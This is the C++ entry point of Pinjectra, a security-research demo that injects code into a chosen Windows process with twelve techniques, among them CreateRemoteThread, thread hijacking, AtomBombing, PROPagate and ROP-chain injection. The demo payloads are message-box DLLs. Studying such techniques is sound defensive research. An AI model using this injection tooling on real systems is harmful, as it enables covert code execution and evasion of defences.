// Copyright (c) 2019, SafeBreach
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
//  * Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
//  * Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
//  * Neither the name of the copyright holder nor the names of its
//    contributors may be used to endorse or promote products derived from
//    this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.

// AUTHORS: Amit Klein, Itzik Kotler
// SEE: https://github.com/SafeBreach-Labs/Pinjectra

#include <iostream>

// Injection Techniques
#include "WindowsHook.h"
#include "CreateRemoteThread.h"
#include "SIR.h"
#include "QueueUserAPC.h"
#include "CtrlInject.h"
#include "ALPC.h"
#include "PROPagate.h"
#include "SetWindowLongPtrA.h"

// Writing Techniques
#include "LLA_GPA.h"
#include "OP_VAE_WPM.h"
#include "CFMA_MVOF_OP_PNMVOS.h"
#include "OT_OP_VAE_GAAA.h"
#include "VAE_WPM.h"
#include "NQAT_WITH_MEMSET.h"
#include "GhostWriting.h"
#include "CFMA_MVOF_NUVOS_NMVOS.h"

// Providers (Other)
#include "HookProcProvider.h"

// Payloads
extern "C" {
	#include "StaticPayloads.h"
}

#include "DynamicPayloads.h"

///////////////
// Functions //
///////////////

void usage(char *progname)
{
	std::cout << "usage: " << progname << " <DEMO ID> <PID> <TID>" << std::endl << std::endl <<
		"DEMOS:" << std::endl <<
		"------" << std::endl << std::endl <<
		"#1: (WindowsHook) " << std::endl << "\t+ LoadLibraryA_GetProcAddress(\"MsgBoxOnGetMsgProc.dll\", \"GetMsgProc\")" << std::endl << std::endl <<
		"#2: (CreateRemoteThread) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(\"MsgBoxOnProcessAttach.dll\") [Entry: LoadLibraryA]" << std::endl << std::endl <<
		"#3: (CreateRemoteThread) " << std::endl << "\t+ CreateFileMappingA_MapViewOfFile_OpenProcess_PNtMapViewOfSection(Static PAYLOAD2)" << std::endl << std::endl <<
		"#4: (SuspendThread/SetThreadContext/ResumeThread) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(Static PAYLOAD1)" << std::endl << std::endl <<
		"#5: (QueueUserAPC) " << std::endl << "\t+ OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA(Static PAYLOAD2)" << std::endl << std::endl <<
		"#6: (CtrlInject) " << std::endl << "\t+ OpenProcess_VirtualAllocEx_WriteProcessMemory(Static PAYLOAD2)" << std::endl << std::endl <<
		"#7: (ALPC)**" << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Static PAYLOAD3) [Try on EXPLORER.EXE PID]" << std::endl << std::endl <<
		"#8: (PROPagate) " << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Static PAYLOAD2)" << std::endl << std::endl <<
		"#9: (SuspendThread/ResumeThread)* " << std::endl << "\t+ NtQueueApcThread with memset(Dyanmic ROP_CHAIN_1)" << std::endl << std::endl <<
		"#10: (SetWindowLongPtrA) " << std::endl << "\t+ VirtualAllocEx_WriteProcessMemory(Dyanmic PAYLOAD4)" << std::endl << std::endl <<
		"#11: (SuspendThread/ResumeThread)* " << std::endl << "\t+ GhostWriting(Dyanmic ROP_CHAIN_2)" << std::endl << std::endl <<
		"#12: (ProcessSuspendInjectAndResume) " << std::endl << "\t+ CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection(Dyanmic PAYLOAD5) [Try on EXPLORER.EXE PID]" << std::endl << std::endl <<
		"* - Requires Target Thread to be in Alertable State" << std::endl <<
		"** - Requires Target to use ALPC Port" << std::endl;

	return ;
}

/////////////////
// Entry Point //
/////////////////

int main(int argc, char **argv)
{
	DWORD pid, tid, demo_id;
	ExecutionTechnique* executor;

	if (argc < 4)
	{
		usage(argv[0]);
		return 0;
	}

	pid = atoi(argv[2]);
	tid = atoi(argv[3]);
	demo_id = atoi(argv[1]);

	switch (demo_id)
	{
		// WindowsHook Demo
		case 1:
			executor = new LoadDLLViaWindowsHook(
				new LoadLibraryA_GetProcAddress("MsgBoxOnGetMsgProc.dll", "GetMsgProc"));
			executor->inject(pid, tid);
			break;

		// CreateRemoteThread Demo + DLL Load (i.e., LoadLibraryA as Entry Point)
		case 2:
			executor = new CodeViaCreateRemoteThread(
				new OpenProcess_VirtualAllocEx_WriteProcessMemory(
					(void *)"MsgBoxOnProcessAttach.dll",
					25,
					PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_READWRITE),
				LoadLibraryA
			);
			executor->inject(pid, tid);
			break;

		//// CreateRemoteThread + Code Injection Demo
		case 3:
			executor = new CodeViaCreateRemoteThread(
				new CreateFileMappingA_MapViewOfFile_OpenProcess_PNtMapViewOfSection(
					_gen_payload_2(),
					PAYLOAD2_SIZE
				)
			);
			executor->inject(pid, tid);
			break;

		// Thread Execution Hijacking Variant #1 (aka. SIR)
		case 4:
			executor = new CodeViaThreadSuspendInjectAndResume(
				new OpenProcess_VirtualAllocEx_WriteProcessMemory(
					_gen_payload_1(),
					PAYLOAD1_SIZE,
					PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_EXECUTE_READWRITE)
			);
			executor->inject(pid, tid);
			break;

		// QueueUserAPC + AtomBombing
		case 5:
			executor = new CodeViaQueueUserAPC(
				new OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA(
					_gen_payload_2(),
					PAYLOAD3_SIZE,
					PROCESS_ALL_ACCESS,
					MEM_RESERVE | MEM_COMMIT,
					PAGE_EXECUTE_READWRITE)
			);
			executor->inject(pid, tid);
			break;

		// CtrlInject
		case 6:
			executor = new CodeViaCtrlInject(
				new OpenProcess_VirtualAllocEx_WriteProcessMemory(
					_gen_payload_2(),
					PAYLOAD3_SIZE,
					PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
					MEM_COMMIT | MEM_RESERVE,
					PAGE_EXECUTE_READWRITE)
			);
			executor->inject(pid, tid);
			break;

		// ALPC
		case 7:
			executor = new CodeViaALPC(
				new VirtualAllocEx_WriteProcessMemory(
					_gen_payload_3(),
					PAYLOAD3_SIZE,
					MEM_COMMIT,
					PAGE_EXECUTE_READWRITE)
			);
			executor->inject(pid, tid);
			break;

		// PROPagate (for EXPLORER)
		case 8:
			executor = new CodeViaPROPagate(
				new VirtualAllocEx_WriteProcessMemory(
					_gen_payload_2(),
					PAYLOAD2_SIZE,
					MEM_COMMIT,
					PAGE_EXECUTE_READWRITE)
			);
			executor->inject(pid, tid);
			break;

		// StackBomber
		case 9:
			executor = new CodeViaThreadSuspendInjectAndResume_Complex(
				new NtQueueApcThread_WITH_memset(
					new _ROP_CHAIN_1()
				)
			);
			executor->inject(pid, tid);
			break;

		// SetWindowLongPtrA
		case 10:
			executor = new CodeViaSetWindowLongPtrA(
				new ComplexToMutableAdvanceMemoryWriter(
					new _PAYLOAD_4()
					,
					new VirtualAllocEx_WriteProcessMemory(
						NULL,
						0,
						MEM_COMMIT | MEM_RESERVE,
						PAGE_EXECUTE_READWRITE)
				)
			);
			executor->inject(pid, tid);
			break;

		// SIR + GhostWriting
		case 11:
			executor = new CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex(
				new GhostWriting(
					new _ROP_CHAIN_2()
				)
			);
			executor->inject(pid, tid);
			break;

		// Unmap Map
		case 12:
			executor = new CodeViaProcessSuspendInjectAndResume_Complex (
				new CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection(
					new _PAYLOAD_5()
				)
			);
			executor->inject(pid, tid);
			break;

	}
}
